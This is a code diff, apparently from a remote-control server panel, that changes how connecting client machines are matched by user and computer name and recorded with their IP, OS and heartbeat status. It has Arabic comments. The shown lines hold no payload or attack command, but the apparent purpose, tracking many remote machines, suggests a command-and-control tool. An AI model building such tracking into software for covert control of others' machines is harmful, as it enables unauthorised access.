@@ -1493,31 +1493,31 @@ loadSessions();
                     pass
                     
             existing_client = None
+            
+            # ⚡ البحث عن العميل الحالي بنفس الكمبيوتر والمستخدم
             for cid, client_data in self.sessions.items():
                 current_user = client_data.get('user', '')
                 current_computer = client_data.get('computer', '')
     
                 if (current_user == incoming_user and 
-                    current_computer == incoming_computer and 
-                    incoming_user != 'Unknown' and 
-                    incoming_computer != 'Unknown'):
+                    current_computer == incoming_computer):
                     existing_client = cid
                     break
                     
-            if existing_client is None and client_id in self.sessions:
-                existing_client = client_id
-    
             if existing_client:
+                # ⚡ تحديث العميل الحالي فقط
                 self.sessions[existing_client]['last_seen'] = current_time
                 self.sessions[existing_client]['status'] = 'online'
                 self.sessions[existing_client]['ip'] = client_ip
-    
+                
                 if incoming_os != 'Unknown':
                     self.sessions[existing_client]['os'] = incoming_os
     
-                print(f"🟢 HEARTBEAT Updated: {incoming_computer} ({incoming_user}) - {client_ip}")
+                print(f"🔄 UPDATED: {incoming_computer} ({incoming_user}) - {client_ip}")
                 self.send_json({'success': True, 'client_id': existing_client, 'instant': True})
+                
             else:
+                # ⚡ إنشاء جديد فقط إذا لم يوجد
                 self.sessions[client_id] = {
                     'id': client_id,
                     'ip': client_ip,
@@ -1531,7 +1531,7 @@ loadSessions();
                     'last_response': None,
                     'status': 'online'
                 }
-                print(f"🟢 NEW CLIENT Registered: {incoming_computer} ({incoming_user}) - {client_ip}")
+                print(f"🆕 NEW: {incoming_computer} ({incoming_user}) - {client_ip}")
                 self.send_json({'success': True, 'client_id': client_id, 'instant': True})
                 
     def send_sessions_list(self):
